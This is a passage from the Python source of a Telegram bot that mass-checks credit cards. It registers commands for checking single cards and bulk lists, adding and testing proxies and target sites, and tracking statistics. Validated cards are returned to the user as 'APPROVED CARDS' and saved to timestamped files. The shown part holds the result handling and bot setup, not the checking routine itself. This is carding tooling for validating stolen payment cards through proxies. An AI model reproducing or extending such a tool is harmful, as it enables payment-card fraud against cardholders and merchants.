            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = SCRIPTS_DIR / f"approved_{timestamp}.txt"
            with open(filename, 'w') as f:
                f.write('\n'.join(approved_cards))
        
        # Send final results
        await status_msg.delete()
        
        results_message = format_mass_message(
            total_cards, len(approved_cards), len(declined_cards),
            site, proxy_count
        )
        
        await update.message.reply_text(results_message, parse_mode=ParseMode.HTML)
        
        # Send approved cards if any
        if approved_cards:
            approved_text = "✅ APPROVED CARDS:\n\n" + "\n".join(approved_cards)
            
            # Split if too long for Telegram
            if len(approved_text) > 4000:
                chunks = [approved_text[i:i+4000] for i in range(0, len(approved_text), 4000)]
                for chunk in chunks:
                    await update.message.reply_text(f"<code>{chunk}</code>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(f"<code>{approved_text}</code>", parse_mode=ParseMode.HTML)
                
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await update.message.reply_text("❌ Error reading file.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Update {update} caused error {context.error}")
    
    # Notify user about error
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text(
                "❌ An error occurred while processing your request."
            )
        except:
            pass

# ========== MAIN FUNCTION ==========

def main():
    """Start the bot"""
    # Load data
    load_data()
    
    print(f"🤖 Bot starting up...")
    print(f"🌐 Proxies loaded: {len(proxies)}")
    print(f"🔗 Sites loaded: {len(sites)}")
    print(f"📊 Total checks: {stats['total_checks']}")
    print(f"✅ Approved: {stats['approved']}")
    print(f"❌ Declined: {stats['declined']}")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mass", mass_command))
    application.add_handler(CommandHandler("addproxy", addproxy_command))
    application.add_handler(CommandHandler("listproxies", listproxies_command))
    application.add_handler(CommandHandler("clearproxies", clearproxies_command))
    application.add_handler(CommandHandler("testproxy", testproxy_command))
    application.add_handler(CommandHandler("addsite", addsite_command))
    application.add_handler(CommandHandler("maddsites", maddsites_command))
    application.add_handler(CommandHandler("listsites", listsites_command))
    application.add_handler(CommandHandler("clearsites", clearsites_command))
    application.add_handler(CommandHandler("testsite", testsite_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # Add document handler for TXT files
    application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Start bot
    print("🚀 Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
